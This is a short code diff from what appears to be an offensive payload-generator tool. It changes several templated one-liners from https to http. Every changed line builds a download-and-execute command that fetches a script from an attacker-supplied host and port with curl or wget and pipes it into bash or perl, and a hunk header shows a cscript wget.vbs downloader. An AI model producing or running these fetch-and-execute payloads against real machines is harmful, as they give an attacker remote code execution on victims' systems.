@@ -792,7 +792,7 @@ cscript wget.vbs http://%s:%s/%s %s
         except:
             file = 'payload.sh'
 
-        _payload = '''curl -s https://%s:%s/%s|bash  ''' % (lhost, lport, file)
+        _payload = '''curl -s http://%s:%s/%s|bash  ''' % (lhost, lport, file)
         print('')
         print(_payload)
         print('')
@@ -805,7 +805,7 @@ cscript wget.vbs http://%s:%s/%s %s
         except:
             file = 'payload.pl'
 
-        _payload = '''curl -s https://%s:%s/%s|perl  ''' % (lhost, lport, file)
+        _payload = '''curl -s http://%s:%s/%s|perl  ''' % (lhost, lport, file)
         print('')
         print(_payload)
         print('')
@@ -818,7 +818,7 @@ cscript wget.vbs http://%s:%s/%s %s
         except:
             file = 'payload.sh'
 
-        _payload = '''wget -q -O - https://%s:%s/%s|bash  ''' % (lhost, lport, file)
+        _payload = '''wget -q -O - http://%s:%s/%s|bash  ''' % (lhost, lport, file)
         print('')
         print(_payload)
         print('')
@@ -831,7 +831,7 @@ cscript wget.vbs http://%s:%s/%s %s
         except:
             file = 'payload.pl'
 
-        _payload = '''wget -q -O - https://%s:%s/%s|perl  ''' % (lhost, lport, file)
+        _payload = '''wget -q -O - http://%s:%s/%s|perl  ''' % (lhost, lport, file)
         print('')
         print(_payload)
         print('')
